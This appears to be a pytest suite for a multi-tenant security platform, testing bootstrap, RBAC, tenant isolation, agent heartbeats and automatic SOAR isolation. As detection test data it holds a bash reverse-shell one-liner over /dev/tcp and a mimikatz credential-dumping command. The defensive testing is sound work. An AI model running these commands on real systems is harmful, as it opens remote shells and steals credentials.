"""End-to-end flow: bootstrap → tenant → employee → agent → SOAR → RBAC."""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.asyncio


async def _bootstrap(client) -> str:
    r = await client.post("/auth/bootstrap", json={"os_username": "root", "os_password": "correct-os-pw"})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["super_admin"] is True
    return body["access_token"]


def _auth(token, tenant=None):
    h = {"Authorization": f"Bearer {token}"}
    if tenant:
        h["X-Tenant-ID"] = tenant
    return h


async def _enroll(client, enrollment_token, agent_uid, **kwargs):
    """Enroll an agent and return its per-agent secret (X-Agent-Secret)."""
    r = await client.post("/agents/enroll", json={
        "enrollment_token": enrollment_token, "agent_uid": agent_uid, **kwargs})
    assert r.status_code == 201, r.text
    return r.json()["agent_secret"]


def _agent_auth(secret):
    return {"X-Agent-Secret": secret}


async def test_bootstrap_rejects_bad_os_password(client):
    r = await client.post("/auth/bootstrap", json={"os_username": "root", "os_password": "wrong"})
    assert r.status_code == 401


async def test_full_flow_and_soar(client, _capture_telegram):
    sa = await _bootstrap(client)

    # Super-admin creates a tenant.
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Acme", "language": "az"})
    assert r.status_code == 201
    tenant = r.json()["tenant_id"]
    enroll_token = r.json()["enrollment_token"]

    # Create a responder employee with granular permissions.
    perms = ["network:view", "agent:view", "agent:isolate", "incident:view", "incident:respond"]
    r = await client.post("/auth/users", headers=_auth(sa),
                          json={"tenant_id": tenant, "username": "resp", "password": "passw0rd!",
                                "permissions": perms})
    assert r.status_code == 201

    r = await client.post("/auth/login", json={"username": "resp", "password": "passw0rd!", "tenant_id": tenant})
    assert r.status_code == 200
    emp = r.json()["access_token"]

    # Agent enrolls with the tenant enrollment token (no user JWT) and gets a secret.
    secret = await _enroll(client, enroll_token, "agent-1", hostname="web01", platform="Linux", ip="10.0.0.9")

    # Heartbeat carrying a CRITICAL event → SOAR playbook auto-isolates.
    r = await client.post("/agents/heartbeat", headers=_agent_auth(secret), json={
        "agent_uid": "agent-1", "status": "active",
        "process_tree": {"pid": 1, "children": [{"pid": 4444, "name": "nc"}]},
        "events": [{"message": "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1", "source_ip": "45.66.77.88"}]})
    assert r.status_code == 200
    action = r.json()["action"]
    assert action and action["isolated"] is True

    # Employee sees the agent isolated and an incident opened.
    r = await client.get("/agents", headers=_auth(emp))
    assert r.status_code == 200
    assert r.json()[0]["status"] == "isolated"

    # The SOAR playbook queued a real enforcement command for the agent to pull.
    r = await client.get("/agents/agent-1/commands", headers=_agent_auth(secret))
    assert r.status_code == 200
    commands = r.json()["commands"]
    assert len(commands) == 1 and commands[0]["command"] == "isolate"
    r = await client.post(f"/agents/agent-1/commands/{commands[0]['id']}/result",
                          headers=_agent_auth(secret), json={"ok": True, "detail": "iptables applied"})
    assert r.status_code == 200

    r = await client.get("/incidents", headers=_auth(emp))
    assert r.status_code == 200 and len(r.json()) == 1
    incident_id = r.json()[0]["id"]

    # Rollback un-isolates.
    r = await client.post(f"/incidents/{incident_id}/rollback", headers=_auth(emp))
    assert r.status_code == 200 and r.json()["rolled_back"] is True

    r = await client.get("/agents", headers=_auth(emp))
    assert r.json()[0]["status"] == "active"


async def test_heartbeat_requires_valid_agent_secret(client):
    """Regression: heartbeat/commands must not be forgeable by guessing agent_uid."""
    sa = await _bootstrap(client)
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "SecretTest"})
    secret = await _enroll(client, r.json()["enrollment_token"], "sec-agent")

    # No secret at all.
    r = await client.post("/agents/heartbeat", json={"agent_uid": "sec-agent"})
    assert r.status_code == 401

    # Wrong secret.
    r = await client.post("/agents/heartbeat", headers=_agent_auth("totally-wrong-secret"),
                          json={"agent_uid": "sec-agent"})
    assert r.status_code == 401

    # Correct secret works.
    r = await client.post("/agents/heartbeat", headers=_agent_auth(secret), json={"agent_uid": "sec-agent"})
    assert r.status_code == 200

    # The command-poll endpoint enforces the same secret.
    r = await client.get("/agents/sec-agent/commands")
    assert r.status_code == 401
    r = await client.get("/agents/sec-agent/commands", headers=_agent_auth(secret))
    assert r.status_code == 200


async def test_isolation_survives_heartbeat_monitor_scan(client):
    """Regression: isolating an agent that had previously done a clean shutdown
    must not have its status silently reverted to 'offline' by the passive
    heartbeat-staleness sweep (services/heartbeat.py scan_once)."""
    from app.services.heartbeat import monitor

    sa = await _bootstrap(client)
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "IsoRace"})
    tenant = r.json()["tenant_id"]
    secret = await _enroll(client, r.json()["enrollment_token"], "iso-agent", hostname="iso-host")

    # Agent does a clean shutdown (sets shutdown_ack=True, status=offline).
    r = await client.post("/agents/heartbeat", headers=_agent_auth(secret),
                          json={"agent_uid": "iso-agent", "shutdown": True})
    assert r.status_code == 200 and r.json()["status"] == "offline"

    # Operator isolates the now-offline host via the network map action.
    r = await client.post("/network/nodes/iso-agent/action", headers=_auth(sa, tenant=tenant),
                          json={"action": "isolate"})
    assert r.status_code == 200 and r.json()["status"] == "isolated"

    # The background staleness sweep must NOT revert this.
    await monitor.scan_once()
    r = await client.get("/agents", headers=_auth(sa, tenant=tenant))
    assert r.json()[0]["status"] == "isolated"
    assert r.json()[0]["isolated"] is True

    # An explicit rollback via the network action still works afterward.
    r = await client.post("/network/nodes/iso-agent/action", headers=_auth(sa, tenant=tenant),
                          json={"action": "rollback"})
    assert r.status_code == 200 and r.json()["status"] == "active"


async def test_rbac_denies_missing_permission(client):
    sa = await _bootstrap(client)
    r = await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Beta"})
    tenant = r.json()["tenant_id"]
    # viewer: no isolate permission
    await client.post("/auth/users", headers=_auth(sa),
                      json={"tenant_id": tenant, "username": "v", "password": "passw0rd!",
                            "permissions": ["network:view", "agent:view"]})
    tok = (await client.post("/auth/login",
           json={"username": "v", "password": "passw0rd!", "tenant_id": tenant})).json()["access_token"]

    # enroll an agent (needs an enrollment token — reuse a fresh tenant token)
    et = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Beta2"})).json()
    await _enroll(client, et["enrollment_token"], "b-agent", hostname="h")
    # viewer of tenant 'Beta' cannot isolate (also different tenant → 404-scoped)
    r = await client.post("/agents/b-agent/isolate", headers=_auth(tok))
    assert r.status_code in (403, 404)


async def test_tenant_isolation(client):
    sa = await _bootstrap(client)
    a = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "A"})).json()
    b = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "B"})).json()

    await _enroll(client, a["enrollment_token"], "a-host", hostname="a-host")
    await _enroll(client, b["enrollment_token"], "b-host", hostname="b-host")

    # Employee of tenant A only ever sees tenant A's agents.
    await client.post("/auth/users", headers=_auth(sa),
                      json={"tenant_id": a["tenant_id"], "username": "ua", "password": "passw0rd!",
                            "permissions": ["agent:view"]})
    tok = (await client.post("/auth/login",
           json={"username": "ua", "password": "passw0rd!", "tenant_id": a["tenant_id"]})).json()["access_token"]
    agents = (await client.get("/agents", headers=_auth(tok))).json()
    uids = {x["agent_uid"] for x in agents}
    assert uids == {"a-host"}

    # A cross-tenant X-Tenant-ID header is rejected by the middleware.
    r = await client.get("/agents", headers=_auth(tok, tenant=b["tenant_id"]))
    assert r.status_code == 403


async def test_ai_analyst_and_map(client):
    sa = await _bootstrap(client)
    t = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "Map"})).json()
    await _enroll(client, t["enrollment_token"], "m1", hostname="m1", platform="Linux")
    # AI query maps to MITRE
    r = await client.post("/ai/query", headers=_auth(sa, tenant=t["tenant_id"]),
                          json={"message": "mimikatz sekurlsa::logonpasswords"})
    assert r.status_code == 200 and r.json()["mitre"] == "T1003"

    # Network map is tenant-scoped and lists the host + gateway.
    r = await client.get("/network/map", headers=_auth(sa, tenant=t["tenant_id"]))
    assert r.status_code == 200
    labels = {n["data"]["label"] for n in r.json()["nodes"]}
    assert "m1" in labels and "Map" in labels
    assert "isolate" in r.json()["available_actions"]  # super-admin has all


async def test_heartbeat_compromise_detection(client, _capture_telegram):
    from app.services.heartbeat import monitor
    sa = await _bootstrap(client)
    t = (await client.post("/auth/tenants", headers=_auth(sa), json={"name": "HB"})).json()
    await _enroll(client, t["enrollment_token"], "hb1", hostname="hb1")
    # Force the heartbeat stale, then scan.
    from app.database import SessionLocal
    from app.models import Agent
    from sqlalchemy import select
    async with SessionLocal() as s:
        agent = (await s.execute(select(Agent).where(Agent.agent_uid == "hb1"))).scalars().first()
        agent.last_heartbeat = 0.0
        await s.commit()
    flagged = await monitor.scan_once()
    assert len(flagged) == 1
    r = await client.get("/agents", headers=_auth(sa, tenant=t["tenant_id"]))
    assert r.json()[0]["status"] == "suspected_compromise"
